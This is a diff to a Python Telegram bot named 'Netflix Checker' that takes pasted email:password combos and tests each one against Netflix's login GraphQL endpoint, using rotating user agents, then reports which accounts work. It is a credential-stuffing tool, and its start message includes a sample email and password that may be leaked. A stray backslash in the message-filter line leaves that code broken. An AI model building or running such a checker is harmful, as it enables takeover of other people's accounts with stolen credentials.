@@ -6,7 +6,13 @@ import logging
 import requests
 from fake_useragent import UserAgent
 from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.ext import (
+    Application, 
+    CommandHandler, 
+    MessageHandler, 
+    filters, 
+    ContextTypes
+)
 
 TOKEN = os.getenv("TELEGRAM_TOKEN")
 
@@ -19,7 +25,7 @@ logger = logging.getLogger(__name__)
 class NetflixChecker:
     def __init__(self):
         self.ua = UserAgent()
-        self.country_codes = {"US": "1", "PH": "63", "IN": "91"}
+        self.country_codes = {"US": "1", "PH": "63", "IN": "91", "GB": "44", "CA": "1"}
 
     def get_country_code(self, country: str) -> str:
         return self.country_codes.get(country.upper(), "1")
@@ -31,8 +37,10 @@ class NetflixChecker:
 
             country = "US"
             try:
-                geo = session.get("https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location",
-                                  headers={"User-Agent": ua}, timeout=10)
+                geo = session.get(
+                    "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location",
+                    headers={"User-Agent": ua}, timeout=10
+                )
                 if geo.status_code == 200:
                     try:
                         country = geo.json().get("country", "US")
@@ -89,7 +97,10 @@ class NetflixChecker:
                 "User-Agent": ua
             }
 
-            res_auth = session.post("https://web.prod.cloud.netflix.com/graphql", json=payload, headers=headers, timeout=20)
+            res_auth = session.post(
+                "https://web.prod.cloud.netflix.com/graphql",
+                json=payload, headers=headers, timeout=20
+            )
 
             if "Navigating to /browse" in res_auth.text or 'universal":"/browse"' in res_auth.text:
                 acc = session.get("https://www.netflix.com/account", headers={"User-Agent": ua}, timeout=15)
@@ -127,12 +138,12 @@ class NetflixChecker:
 
         except Exception as e:
             logger.error(f"Error: {e}")
-            return f"⚠️ Error checking {email}"
+            return f"⚠️ Error checking account"
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "👋 <b>Netflix Checker Bot</b>\n\n"
-        "Send email:password combos (one per line)\n"
+        "Send email:password (one per line)\n"
         "Example:\n<code>giorgio_valiente@yahoo.com:giorgiovaliente021</code>",
         parse_mode='HTML'
     )
@@ -144,7 +155,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     lines = [line.strip() for line in update.message.text.splitlines() if ':' in line.strip()]
 
     if not lines:
-        await update.message.reply_text("❌ Send email:password")
+        await update.message.reply_text("❌ Please send valid email:password combos")
         return
 
     checker = NetflixChecker()
@@ -156,21 +167,24 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             result = await checker.check_account(email, password)
             await update.message.reply_text(result, parse_mode='HTML', disable_web_page_preview=True)
         except:
-            await update.message.reply_text(f"❌ Invalid line: {line}")
+            await update.message.reply_text(f"❌ Invalid: {line}")
 
     await update.message.reply_text("✅ Check completed!", parse_mode='HTML')
 
 def main():
     if not TOKEN:
-        logger.error("TELEGRAM_TOKEN not set!")
+        logger.error("TELEGRAM_TOKEN not set in Railway variables!")
         return
 
     application = Application.builder().token(TOKEN).build()
 
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))
+    
+    # Fixed handler - split properly to avoid any continuation issues
+    message_filter = filters.TEXT & \~filters.COMMAND
+    application.add_handler(MessageHandler(message_filter, handle_message))
 
-    logger.info("🚀 Netflix Checker Bot is running!")
+    logger.info("🚀 Netflix Checker Bot started successfully!")
     application.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
